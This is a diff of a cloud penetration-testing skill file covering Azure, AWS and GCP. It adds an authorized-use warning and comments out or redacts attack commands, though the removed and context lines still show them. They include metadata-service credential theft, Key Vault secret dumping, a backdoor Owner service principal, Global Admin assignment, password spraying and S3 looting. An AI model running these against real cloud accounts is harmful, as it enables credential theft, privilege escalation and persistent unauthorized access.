@@ -1,7 +1,7 @@
 ---
 name: cloud-penetration-testing
 description: "Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP)."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -10,6 +10,11 @@ date_added: "2026-02-27"
 <!-- security-allowlist: curl-pipe-bash -->
 
 # Cloud Penetration Testing
+
+> [!WARNING]
+> **Authorized Use Only**
+> This skill contains offensive security techniques. It must only be used on systems and networks where you have explicit, written authorization to perform security testing.
+
 
 ## Purpose
 
@@ -161,7 +166,7 @@ foreach($user in $users){
 }
 
 # Execute commands on VMs
-Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1
+Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./[REDACTED_SCRIPT_PATH].ps1
 
 # Extract VM UserData
 $vms = Get-AzVM
@@ -171,7 +176,7 @@ $vms.UserData
 az keyvault list --query '[].name' --output tsv
 az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
 az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
-az keyvault secret show --id <URI>
+# az keyvault secret show --id <URI> # [REDACTED_SECRET_RETRIEVAL]
 ```
 
 ### Phase 5: Azure Persistence
@@ -180,21 +185,21 @@ Establish persistence in Azure:
 
 ```powershell
 # Create backdoor service principal
-$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
+$spn = New-AzAdServicePrincipal -DisplayName "[REDACTED_BACKDOOR_SPN_NAME]" -Role Owner
 $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
 $UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
 
 # Add service principal to Global Admin
 $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
 $role = Get-MsolRole -RoleName "Company Administrator"
-Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+# Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId # [REDACTED_PRIVILEGE_ESCALATION]
 
 # Login as service principal
 $cred = Get-Credential  # AppID as username, secret as password
 Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal
 
 # Create new admin user via CLI
-az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
+# az ad user create --display-name [REDACTED_BACKDOOR_USER] --password [REDACTED_PASSWORD] --user-principal-name [REDACTED_UPN] # [REDACTED_PERSISTENCE]
 ```
 
 ### Phase 6: AWS Authentication
@@ -258,15 +263,15 @@ aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
 # AttributeValues = "all" means publicly accessible
 
 # Extract Lambda environment variables (may contain secrets)
-aws lambda get-function --function-name <name> | jq '.Configuration.Environment'
+# aws lambda get-function --function-name <name> | jq '.Configuration.Environment' # [REDACTED_SECRET_RETRIEVAL]
 
 # Access metadata service (from compromised EC2)
 curl http://169.254.169.254/latest/meta-data/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ # [REDACTED_METADATA_EXFILTRATION]
 
 # IMDSv2 access
 TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
+# curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN" # [REDACTED_METADATA_EXFILTRATION]
 ```
 
 ### Phase 9: AWS Persistence
@@ -278,7 +283,7 @@ Establish persistence in AWS:
 aws iam list-access-keys --user-name <username>
 
 # Create backdoor access key
-aws iam create-access-key --user-name <username>
+# aws iam create-access-key --user-name <username> # [REDACTED_PERSISTENCE]
 
 # Get all EC2 public IPs
 for region in $(cat regions.txt); do
@@ -337,13 +342,13 @@ Exploit GCP misconfigurations:
 
 ```bash
 # Get metadata service data
-curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
+# curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google" # [REDACTED_METADATA_EXFILTRATION]
 
 # Check access scopes
 curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'
 
 # Decrypt data with keyring
-gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global
+# gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global # [REDACTED_DATA_EXFILTRATION]
 
 # Serverless function analysis
 gcloud functions list
@@ -448,7 +453,7 @@ python fire.py --access_key <key> --secret_access_key <secret> --region us-east-
 
 # Spray passwords
 Import-Module .\MSOLSpray.ps1
-Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
+Invoke-MSOLSpray -UserList .\users.txt -Password "[REDACTED_PASSWORD]" -URL https://[REDACTED_API_GATEWAY_URL]/fireprox
 ```
 
 ### Example 2: AWS S3 Bucket Enumeration
@@ -466,7 +471,7 @@ while read bucket; do
 done < buckets.txt
 
 # Download interesting bucket
-aws s3 sync s3://misconfigured-bucket ./loot/
+# aws s3 sync s3://misconfigured-bucket ./[REDACTED_LOOT_DIR]/ # [REDACTED_DATA_EXFILTRATION]
 ```
 
 ### Example 3: GCP Service Account Compromise
